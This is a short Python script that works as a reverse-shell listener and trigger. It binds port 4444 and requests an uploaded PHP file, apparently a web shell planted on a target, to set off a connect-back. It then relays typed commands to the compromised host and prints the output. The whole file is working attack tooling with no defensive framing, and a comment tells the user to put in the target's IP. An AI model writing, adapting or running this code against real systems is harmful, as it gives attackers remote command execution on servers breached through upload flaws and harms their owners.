import requests
import socket
import threading
import time

def handle_connection(client_socket):
    print("Reverse shell connected! Type commands (or 'exit' to quit).")
    while True:
        # Get command from user input
        command = input("> ")
        if command.lower() in ['exit', 'quit']:
            client_socket.send(b"exit\n")
            break
        # Send command to the reverse shell
        client_socket.send((command + "\n").encode('utf-8'))
        # Receive and print the response
        try:
            response = client_socket.recv(1024).decode('utf-8')
            print(f"Response: {response}")
        except Exception as e:
            print(f"Error receiving response: {e}")
            break
    client_socket.close()

def execute_command(command):
    import subprocess
    result = subprocess.getoutput(command)
    return result

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('0.0.0.0', 4444))  # Bind to all interfaces
    server_socket.listen(1)
    print("Server listening on port 4444...")
    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr}")
        client_thread = threading.Thread(target=handle_connection, args=(client_socket,))
        client_thread.start()

if __name__ == "__main__":
    # Start the server first to ensure it's listening
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

    # Wait a moment to ensure the server is ready
    time.sleep(1)

    # Trigger the URL
    trigger_url = "http://localhost/uploads/reverse3.php"  # Replace <target-ip> with the target's IP
    response = requests.get(trigger_url)
    print(f"Trigger response: {response.text}")


    # Keep the script running to handle the connection
    server_thread.join()